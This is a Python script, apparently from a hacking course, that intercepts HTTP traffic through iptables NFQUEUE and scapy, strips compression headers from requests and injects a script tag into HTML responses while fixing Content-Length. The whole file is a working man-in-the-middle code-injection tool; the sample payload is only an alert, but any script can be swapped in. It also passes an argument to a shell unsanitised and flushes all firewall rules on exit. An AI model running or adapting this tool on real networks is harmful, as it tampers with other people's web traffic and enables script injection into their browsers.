#!/usr/bin/env python
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)
import scapy.all as scapy
import netfilterqueue
import re
import subprocess
import argparse
from colorama import init, Fore		# for fancy/colorful display

class Code_injector:
    def __init__(self):
        # initialize colorama
        init()
        # define colors
        self.GREEN = Fore.GREEN
        self.RED = Fore.RED
        self.Cyan = Fore.CYAN
        self.Yellow = Fore.YELLOW
        self.RESET = Fore.RESET

    def arguments(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--queue-num', dest='queue', help='Specify The Queue Number')
        value = parser.parse_args()
        if not value.queue:
            parser.error('\n{}[-] Please Specify The Queue Number {}'.format(self.Cyan, self.RESET))
        return value

    def get_load(self, packet, load):
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def process_packets(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            load = scapy_packet[scapy.Raw].load
            if scapy_packet[scapy.TCP].dport == 80:
                print('{}[+] HTTP Request {}'.format(self.RED, self.RESET))
                load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)

            elif scapy_packet[scapy.TCP].sport == 80:
                print('{}[+] HTTP Response {}'.format(self.GREEN, self.RESET))
                injection_code = "<script>alert('Test');</script>"
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)     # holds integer value
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = self.get_load(scapy_packet, load)
                packet.set_payload(str(new_packet))     # convert back to original packe8

        packet.accept()

    def start(self):
        try:
            option = self.arguments()
            subprocess.call(['clear'])

            print('{}\n\n\t\t\t\t\t#########################################################{}'.format(self.Cyan, self.RESET))
            print('\n{}\t\t\t\t\t#\t\t  Inject Code On HTTP Sites\t\t#\n{}'.format(self.Cyan, self.RESET))
            print('{}\t\t\t\t\t#########################################################{}\n\n'.format(self.Cyan, self.RESET))
            print('\n\n{}[+] Enable IP Tables ...{}\n'.format(self.Yellow, self.RESET))
            subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num {}'.format(option.queue), shell=True)
            subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num {}'.format(option.queue), shell=True)
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(int(option.queue) , self.process_packets)
            queue.run()
        except KeyboardInterrupt:
            print('\n{}[*] Flush IP Tables {}'.format(self.Yellow, self.RESET))
            subprocess.call('iptables --flush', shell=True)

if __name__ == "__main__":
    code_injector = Code_injector()
    code_injector.start()